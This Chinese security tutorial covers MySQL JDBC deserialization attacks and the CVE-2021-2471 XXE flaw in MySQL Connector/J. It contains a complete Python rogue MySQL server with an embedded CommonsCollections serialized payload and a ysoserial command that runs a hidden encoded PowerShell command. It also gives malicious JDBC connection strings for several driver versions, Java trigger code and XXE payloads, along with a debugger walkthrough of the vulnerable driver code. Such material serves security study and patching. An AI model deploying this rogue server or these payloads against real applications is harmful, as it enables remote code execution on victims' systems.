---
title: 【WEB】Java JDBC反序列化
---

# Java JDBC

## JDBC简介

> JDBC(Java Database Connectivity)是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的API接口(JDBC)，不同的数据库提供商必须实现JDBC定义的接口从而也就实现了对数据库的一系列操作。

## JDBC Connection

> JDBC定义了一个叫`java.sql.Driver`的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。`java.sql.DriverManager.getConnection(xxx)`其实就是间接的调用了`java.sql.Driver`类的`connect`方法实现数据库连接的。数据库连接成功后会返回一个叫做`java.sql.Connection`的数据库连接对象，一切对数据库的查询操作都将依赖于这个`Connection`对象。 

一般连接格式：

```
jdbc:driver://host:port/database?setting1=value1&setting2=value2
```

## JDBC Unserialize

### 原理

> 假设攻击者能够控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发`ObjectInputStream.readObject()`达到反序列化的目的从而RCE。
>
> 具体来说，通过JDBC连接MySQL服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在MySQL客户端进行处理时会被`ObjectInputStream.readObject()`进行反序列化处理。如果攻击者可以控制JDBC连接设置项，那么可以通过设置其配置指向恶意MySQL服务触发MySQL JDBC客户端的反序列化漏洞。

可被利用的两条查询语句：

- SHOW SESSION STATUS
- SHOW COLLATION

### 利用步骤

搭建恶意MySQL服务器，参考[MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)和[Rogue_MySQL_Server](https://github.com/rmb122/rogue_mysql_server)。

构造demo，添加`mysql-connector-java-8.0.19`和`commons-collections-3.2.1`依赖，pom.xml写法如下

```xml
    <dependency>
      <groupId>mysql</groupId>
      <artifactId>mysql-connector-java</artifactId>
      <version>8.0.19</version>
    </dependency>

    <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.2.1</version>
    </dependency>
```

攥写demo代码，样例以`ServerStatusDiffInterceptor`作为触发点

```java
package org.example;

import java.sql.*;

public class App {
    public static void main(String[] args) throws Exception {
        String ClassName = "com.mysql.jdbc.Driver";
        String JDBC_Url = "jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?"+
                "autoDeserialize=true"+
                "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
        String username = "root";
        String password = "root";
        Class.forName(ClassName);
        Connection connection = DriverManager.getConnection(JDBC_Url, username, password);
    }
}
```

在公网上启用恶意MySQL服务

```python
# -*-coding:utf-8-*-
import socket
import binascii
import os

greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
response_ok_data="0700000200000002000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiveing the package : {}".format(data))
    return str(data).lower()

def send_data(conn,data):
    print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] > payload
    file= r'payload'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
        print("open successs")

    else:
        print("open false")
        #calc
        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

# 主要逻辑
def run():

    while 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))

        # 1.先发送第一个 问候报文
        send_data(conn,greeting_data)

        while True:
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)

            #其他过程
            data=receive_data(conn)
            #查询一些配置信息,其中会发送自己的 版本号
            if "session.auto_increment_increment" in data:
                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn,_payload)
                data=receive_data(conn)
            elif "show warnings" in data:
                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn, _payload)
                data = receive_data(conn)
            if "set names" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "set character_set_results" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "show session status" in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                # 为什么我加了EOF Packet 就无法正常运行呢？？
                # 获取payload
                payload_content=get_payload_content()
                # 计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                # 计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if "show warnings" in data:
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn, payload)
            break


if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 3306

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print("start fake mysql server listening on {}:{}".format(HOST,PORT))

    run()
```

通过ysoserial制作CommonCollections 5的payload

```
java -jar ysoserial.jar CommonsCollections5 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc YwBhAGwAYwAuAGUAeABlAA==" > payload
```

然后windows下运行demo就会触发powershell打开计算器

![demo](/images/jdbc/demo.gif)

### 漏洞分析

主要分析` ServerStatusDiffInterceptor`触发的漏洞原因。

放置断点在`DriverManager.getConnection`处，然后跟进，在`mysql-connector-java-8.0.19.jar/com/mysql/cj/jdbc/ConnectionImpl:730`处设置` ServerStatusDiffInterceptor `

![1639912376869](/images/jdbc/1639912376869.png)

继续跟进，程序从MySQL服务端来初始化Properties并执行相关的SQL语句，在`mysql-connector-java-8.0.19.jar/com/mysql/cj/protocol/a/NativeProtocol:612`处，判断拦截器是否为空，如果不为空则调用拦截器的preProccess函数。

![1639912652758](/images/jdbc/1639912652758.png)

![1639913370875](/images/jdbc/1639913370875.png)

继续跟进，在`mysql-connector-java-8.0.19.jar/com/mysql/cj/jdbc/interceptors/ServerStatusDiffInterceptor.class:55`可以查看到运行查询语句SHOW SESSION STATUS，然后调用`ResultSetUtil.resultSetToMap()`函数，该函数调用了触发反序列化漏洞的`getObject()`函数。

![1639912991843](/images/jdbc/1639912991843.png)

![1639913305959](/images/jdbc/1639913305959.png)

 此处columnIndex为2处才能走到反序列化的代码逻辑，为1则直接返回null。 

![1639913333697](/images/jdbc/1639913333697.png)

在`mysql-connector-java-8.0.19.jar/com/mysql/cj/jdbc/result/ResultSetImpl.class:1079`可以很明显的看到。

![1639913734078](/images/jdbc/1639913734078.png)

判断MySQL类型为BLOB后，从MySQL服务端中获取对应的字节码数据、判断autoDeserialize是否为true、字节码数据是否为序列化对象等条件后调用`readObject()`触发反序列化漏洞。

![demo1](/images/jdbc/demo1.gif)

当MySQL字段类型为BLOB时，会对数据进行反序列化操作，因此只要保证第1或第2字段为BLOB类型且存储了恶意序列化数据即可触发JDBC反序列化漏洞。

## Payload Exploit

### 以`ServerStatusDiffInterceptor`为触发点

**8.x**

```
jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

**6.x**

属性名不同，queryInterceptors更改为statementInterceptors

```
jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

**>=5.1.11**

jar包中没有cj

```
jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
```

**5.x <= 5.1.10**

同5.1.11的payload，但需要连接后执行查询。

### 以`detectCustomCollations`为触发点

**5.1.29 - 5.1.40**

```
jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?detectCustomCollations=true&autoDeserialize=true
```

5.1.28 - 5.1.19

```
jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true
```
## CVE-2021-2471

> 这个漏洞是由于MySQL JDBC 8.0.27版本之前，存在`getSource()`方法未对传入的XML数据做校验，导致攻击者可以在XML数据中引入外部实体，造成XXE攻击。
>
> 影响版本：< 8.0.27

搭建`mysql-connector-java-8.0.26`依赖的环境再与其8.0.27版本做对比

```xml
<!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java -->
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>8.0.26</version>
</dependency>
```

在`mysql-connector-java-8.0.26.jar/com/mysql/cj/jdbc/MysqlSQLXML.class:174`，将与其修复版本8.0.27进行对比。

![1639920417039](/images/jdbc/1639920417039.png)

8.0.27在原有基础上设置了安全属性，在对象实例化之前做了校验。

### 利用步骤

创建一个数据库，里面包含一张表，然后通过JDBC连接，通过java创建一个SQLXML对象即可调用`getSource()`方法。

```java
package org.example;

import javax.xml.transform.dom.DOMSource;
import java.sql.*;

public class CVEdemo {
    public static void main(String[] args) throws Exception {
        String db_ip = "127.0.0.1";
        String db_port = "3306";
        String db_name = "test";
        String db_user = "test";
        String db_pass = "123456";

        String url = "jdbc:mysql://"+db_ip+":"+db_port+"/"+db_name+"";
        String xxe = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "<!ELEMENT foo ANY >\n" +
                "<!ENTITY xxe SYSTEM \"http://127.0.0.1:8888/test.dtd\" >\n" +
                "]>\n" +
                "<foo>&xxe;</foo>";

        Connection con = DriverManager.getConnection(url, db_user, db_pass);
        SQLXML sqlxml = con.createSQLXML();
        sqlxml.setString(xxe);
        sqlxml.getSource(DOMSource.class);
    }
}
```

触发XXE

![demo2](/images/jdbc/demo2.gif)

通过往表中插入xml语句利用`resulrSet.getSQLXML`从数据库中建立SQLXML对象也是可行的。

```java
package org.example;

import javax.xml.transform.dom.DOMSource;
import java.sql.*;

/**
 * CVE-2021-2471
 * https://nvd.nist.gov/vuln/detail/CVE-2021-2471
 *
 * create table tb_test (id bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',message text COMMENT 'SQLXML',PRIMARY KEY (`id`));
 *
 * insert into tb_test(message) value('<?xml version="1.0" ?> <!DOCTYPE note [ <!ENTITY % remote SYSTEM "http://127.0.0.1:8888/test.dtd"> %remote; ]>');
 */
public class OracleJDBC {

    public static void main(String[] args) throws SQLException {
        String db_ip = "127.0.0.1";
        String db_port = "3306";
        String db_name = "test";
        String db_user = "test";
        String db_pass = "123456";

        String url = "jdbc:mysql://"+db_ip+":"+db_port+"/"+db_name+"";
        Connection connection = DriverManager.getConnection(url, db_user, db_pass);
        if (connection != null) {
            Statement statement = connection.createStatement();
            statement.execute("select * from tb_test");
            ResultSet resultSet = statement.getResultSet();
            while (resultSet.next()) {
                SQLXML sqlxml = resultSet.getSQLXML("message");
                sqlxml.getSource(DOMSource.class);
            }
        }
    }
}
```

## 更多参考

[MySQL JDBC反序列化漏洞小结](https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%B0%8F%E7%BB%93)

[Oracle MySQL JDBC XXE漏洞（CVE-2021-2471）](https://mp.weixin.qq.com/s/erIFMiPNB2XSBJSqXyxuKg)

[SQLXML XXE vulnerability](https://github.com/h2database/h2database/issues/3195)

[CVE-2021-2471 - XXE in MySQL Connector](https://github.com/DrunkenShells/CVE-2021-2471)

